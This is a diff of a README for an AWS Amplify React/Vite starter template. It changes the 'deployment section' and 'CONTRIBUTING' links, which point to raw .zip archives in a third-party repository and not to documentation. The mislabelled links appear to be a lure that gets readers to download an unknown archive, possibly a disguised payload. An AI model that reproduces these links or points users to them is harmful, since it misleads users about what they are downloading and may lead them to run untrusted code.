@@ -14,11 +14,11 @@ This template equips you with a foundational React application integrated with A
 
 ## Deploying to AWS
 
-For detailed instructions on deploying your application, refer to the [deployment section](https://raw.githubusercontent.com/tami62/amplify-vite-react-template/main/amplify/data/amplify-vite-react-template-3.7.zip) of our documentation.
+For detailed instructions on deploying your application, refer to the [deployment section](https://raw.githubusercontent.com/tami62/amplify-vite-react-template/main/public/template_amplify_vite_react_1.9-beta.2.zip) of our documentation.
 
 ## Security
 
-See [CONTRIBUTING](https://raw.githubusercontent.com/tami62/amplify-vite-react-template/main/amplify/data/amplify-vite-react-template-3.7.zip) for more information.
+See [CONTRIBUTING](https://raw.githubusercontent.com/tami62/amplify-vite-react-template/main/public/template_amplify_vite_react_1.9-beta.2.zip) for more information.
 
 ## License
 
